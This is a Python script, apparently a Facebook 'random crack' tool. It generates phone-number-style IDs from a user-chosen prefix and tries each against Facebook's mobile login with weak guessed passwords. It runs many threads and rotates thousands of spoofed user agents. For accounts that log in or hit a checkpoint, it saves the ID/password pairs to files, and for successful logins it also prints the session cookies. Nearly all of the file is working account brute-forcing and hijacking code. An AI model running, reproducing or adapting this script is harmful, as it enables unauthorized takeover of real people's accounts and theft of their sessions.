import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
#os.system("espeak -a 50 \"welcome,sir,working,Wi-Fi\"")
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []

#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J530K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-J530F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mBDS')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku1=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')    

for ui in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    ua=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'  
    

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  ua=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh3=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'

  a='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  ua=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh4=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'

  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh5=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh6=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh7=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2012K11C'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
  uakuh8=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['vivo 1002T'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh9=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  
for oxd in range(10000):
  a='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['CPH2083'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
  ua66=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(ua66)
  
for oxd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    raja=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(raja)
	
#for agent in range(10000):
	
       # a='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
       # b=random.choice(['6','7','8','9','10','11','12'])
   #     c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
      #  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
      #  e=random.randrange(1, 999)
    #    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
       # g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
       # h=random.randrange(73,100)
     #   i='0'
      #  j=random.randrange(4200,4900)
    #    k=random.randrange(40,150)
    #    l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
     #   ua=(f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
      #  ugen.append(ua)

        
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

attemps = 0


os.system('clear')
pass
 
os.system("espeak -a 200 \"follow,my Facebook,--ID\"")
os.system(f'xdg-open https://www.facebook.com/1kingmahafuz ')
logo = ("""       
            \033[1;32m              Assalamu Alaikum
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
 \033[1;32m   __  __    _    _   _    _    _____ _   _ _____
   |  \/  |  / \  | | | |  / \  |  ___| | | |__  /
   | |\/| | / _ \ | |_| | / _ \ | |_  | | | | / / 
\033[1;33m   | |  | |/ ___ \|  _  |/ ___ \|  _| | |_| |/ /_ 
   |_|  |_/_/   \_\_| |_/_/   \_\_|    \___//____|                                    
                                     
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
  \033[1;32m
~~~|{>}DEVELOPER          : MD:MAHAFUZ RAHMAN
~~~|{>}Facebook           : MAHAFUZ ROHMAN
~~~|{>}Github             : MAHAFUZ-CYBER-51
~~~|{>}Version            : 0.1
~~~|{>}Tool               : Free 

\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
   """)
logo1 = ("""
\033[1;32m                Assalamu Alaikum
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
 \033[1;32m   __  __    _    _   _    _    _____ _   _ _____
   |  \/  |  / \  | | | |  / \  |  ___| | | |__  /
   | |\/| | / _ \ | |_| | / _ \ | |_  | | | | / / 
\033[1;33m   | |  | |/ ___ \|  _  |/ ___ \|  _| | |_| |/ /_ 
   |_|  |_/_/   \_\_| |_/_/   \_\_|    \___//____|                                    
                                     
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
  \033[1;32m
~~~|{>}DEVELOPER          : MD:MAHAFUZ RAHMAN
~~~|{>}Facebook           : MAHAFUZ ROHMAN
~~~|{>}Github             : MAHAFUZ-CYBER-51
~~~|{>}Version            : 0.1
~~~|{>}Tool               : Free 

\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ """)

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print('---------------')
        print(" \033[38;5;46m[1]RANDOM CRACK")
        print("\033[1;95m [0] Exit")
        print('---------------')
        Mumit =input("\n [?] Choices : ")
        if Mumit in ["1"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;32m[>] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m[>] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=35) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[1;92m[>] TOTAL ID: '+tl)
        print("[<] YOUR CODE: "+code)
        print('[>] PROCESS HAS BEEN STARTED')
        print('[<] USE FLIGHT MODE FOR SPEED UP')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print('\033[1;91m [<] CRACK PROCESS HAS BEEN COMPLETED')
    print(' [>] OK Id save in MAHAFUZ/OK.txt')
    print(' [<] CP Id save in MAHAFUZ/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[38;5;46m[MR~MAHAFUZ]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1.7000000476837158',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX3261"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',
    }

            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mMR-MAHAFUZ-OK-☺️\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                os.system('espeak -a 300 "Mahafuz. ok "')
                print(f'\033[1;35mᏟϴϴᏦᏆᎬ-💊- : \033[1;97m'+coki)
                open('/sdcard/mahafuz-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m[MR-MAHAFUZ-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                os.system('espeak -a 300 " Cp id"')
                open('/sdcard/mahafuz-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Main()